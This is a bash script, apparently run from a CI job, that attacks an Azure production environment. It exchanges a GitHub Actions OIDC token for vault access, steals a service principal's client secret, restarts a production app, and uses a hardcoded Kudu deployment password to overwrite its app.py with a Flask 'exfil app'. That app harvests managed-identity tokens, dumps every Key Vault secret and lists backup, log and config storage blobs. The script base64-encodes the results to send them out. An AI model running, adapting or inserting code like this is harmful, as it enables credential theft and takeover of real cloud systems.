#!/bin/bash
set -e

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

VT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
VT=$(echo "$VT_RAW" | jq -r .access_token)

# Get reporting-service-principal credentials
RSP=$(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r .value)
CID=$(echo "$RSP" | jq -r .appId)
CSE=$(echo "$RSP" | jq -r .clientSecret)
echo "RSP: appId=$CID"

# Get management token
MT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$CID" \
  -d "client_secret=$CSE" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials")
MT=$(echo "$MT_RAW" | jq -r .access_token)
echo "MT_LEN=${#MT}"

SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-reporting-prod-eus"
APP="app-tbl-reporting-prod"

# List all resources in reporting RG
echo "=== Resources in $RG ==="
RES=$(curl -sS -H "Authorization: Bearer $MT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/resources?api-version=2021-04-01")
echo "RES_B64=$(echo "$RES" | base64 -w0)"

# Check MI role assignments
echo "=== MI Role Assignments (f64d08c7) ==="
MIROLES=$(curl -sS -H "Authorization: Bearer $MT" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'f64d08c7-fde6-4553-99c8-5bf73666ee8c'")
echo "MIROLES_B64=$(echo "$MIROLES" | base64 -w0)"

# Try to restart the app
echo "=== Restart App ==="
RESTART=$(curl -sS -w "\nHTTP:%{http_code}" -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/restart?api-version=2023-12-01" 2>&1)
echo "RESTART=$(echo "$RESTART" | tail -1)"

# Deploy my app.py that gets MSI token and reads secrets
# First, upload via zipdeploy after restart
echo "=== Writing exfil app to /home ==="
# Use Kudu to write the file
SCM_CRED=$(echo -n '$app-tbl-reporting-prod:Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A' | base64)
EXFIL_PY='import os,json,urllib.request
from flask import Flask
app=Flask(__name__)
@app.route("/")
def index():return "msi-probe-v1"
@app.route("/e")
def exfil():
    r={}
    ie=os.environ.get("IDENTITY_ENDPOINT","")
    ih=os.environ.get("IDENTITY_HEADER","")
    cid="7a85156a-01c4-4e61-8472-40a92107159b"
    r["env"]={"ie":ie,"ih_len":len(ih),"cid":cid}
    if ie and ih:
        for scope in ["https://vault.azure.net","https://storage.azure.com","https://management.azure.com"]:
            sn=scope.split("//")[1].split(".")[0]
            try:
                url=f"{ie}?resource={scope}&api-version=2019-08-01&client_id={cid}"
                req=urllib.request.Request(url,headers={"X-IDENTITY-HEADER":ih})
                with urllib.request.urlopen(req,timeout=10) as resp:
                    data=json.loads(resp.read())
                    token=data.get("access_token","")
                    r[f"token_{sn}_len"]=len(token)
                    if sn=="vault":
                        for kv in ["kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"]:
                            try:
                                req2=urllib.request.Request(f"https://{kv}.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":f"Bearer {token}"})
                                with urllib.request.urlopen(req2,timeout=10) as rr:
                                    slist=json.loads(rr.read())
                                    for s in slist.get("value",[]):
                                        sname=s["id"].split("/")[-1]
                                        try:
                                            req3=urllib.request.Request(f"{s[\"id\"]}?api-version=7.4",headers={"Authorization":f"Bearer {token}"})
                                            with urllib.request.urlopen(req3,timeout=10) as rrr:
                                                r[f"{kv}/{sname}"]=json.loads(rrr.read()).get("value","")[:500]
                                        except Exception as e3:
                                            r[f"{kv}/{sname}"]=f"ERR:{e3}"
                            except urllib.request.HTTPError as e2:
                                r[kv]=f"HTTP{e2.code}"
                            except Exception as e2:
                                r[kv]=str(e2)
                    elif sn=="storage":
                        for pair in [("sttblcilogsprodx3euoz","logs"),("sttblbackupprodx3euoz","exports"),("sttblappcfgprodx3euoz","config")]:
                            sa,cont=pair
                            try:
                                req2=urllib.request.Request(f"https://{sa}.blob.core.windows.net/{cont}?restype=container&comp=list",headers={"Authorization":f"Bearer {token}","x-ms-version":"2020-10-02"})
                                with urllib.request.urlopen(req2,timeout=10) as rr:
                                    import base64
                                    r[f"{sa}/{cont}"]=base64.b64encode(rr.read()).decode()
                            except urllib.request.HTTPError as e2:
                                r[f"{sa}/{cont}"]=f"HTTP{e2.code}"
                            except Exception as e2:
                                r[f"{sa}/{cont}"]=str(e2)
            except Exception as e:
                r[f"token_{sn}_err"]=str(e)
    with open("/home/site/wwwroot/results.json","w") as f:
        json.dump(r,f,indent=2,default=str)
    return json.dumps(r,indent=2,default=str)
if __name__=="__main__":
    app.run(host="0.0.0.0",port=8000)
'

# Upload via Kudu VFS
curl -sS -X PUT -H "Authorization: Basic $SCM_CRED" -H "If-Match: *" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "$EXFIL_PY" \
  "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/vfs/site/wwwroot/app.py"
echo "UPLOAD_DONE"

# Wait for restart to take effect
sleep 15

# Try to hit the app
echo "=== Test App ==="
ROOT=$(curl -sS -w "\nHTTP:%{http_code}" "https://app-tbl-reporting-prod.azurewebsites.net/" 2>&1)
echo "ROOT=$(echo "$ROOT" | tail -1)"
echo "ROOT_BODY=$(echo "$ROOT" | head -1)"

EXFIL=$(curl -sS -w "\nHTTP:%{http_code}" "https://app-tbl-reporting-prod.azurewebsites.net/e" 2>&1)
echo "EXFIL_B64=$(echo "$EXFIL" | head -n -1 | base64 -w0)"

echo "=== DONE ==="